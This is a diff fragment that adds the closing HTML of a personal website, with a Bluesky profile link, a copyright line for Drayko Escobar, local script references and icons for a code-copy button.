+  
+    <a href="https://bsky.app/profile/draykoes.bsky.social" target="_blank" title="Bluesky" class="flex flex-row mr-2">
+      <span class="hidden">Bluesky</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+    class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bluesky">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path
+        d="M6.335 5.144c-1.654 -1.199 -4.335 -2.127 -4.335 .826c0 .59 .35 4.953 .556 5.661c.713 2.463 3.13 2.75 5.444 2.369c-4.045 .665 -4.889 3.208 -2.667 5.41c1.03 1.018 1.913 1.59 2.667 1.59c2 0 3.134 -2.769 3.5 -3.5c.333 -.667 .5 -1.167 .5 -1.5c0 .333 .167 .833 .5 1.5c.366 .731 1.5 3.5 3.5 3.5c.754 0 1.637 -.571 2.667 -1.59c2.222 -2.203 1.378 -4.746 -2.667 -5.41c2.314 .38 4.73 .094 5.444 -2.369c.206 -.708 .556 -5.072 .556 -5.661c0 -2.953 -2.68 -2.025 -4.335 -.826c-2.293 1.662 -4.76 5.048 -5.665 6.856c-.905 -1.808 -3.372 -5.194 -5.665 -6.856z" />
+</svg>
+ </i>
+    </a>
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2010 - 2025 Drayko Escobar
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.min.65ca5b0808abf278fcec5d424701ebf0b4bc46a737129cd5e57fdb739f463e79.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js"></script>
+
+
+
+
+
+</body>
+</html>
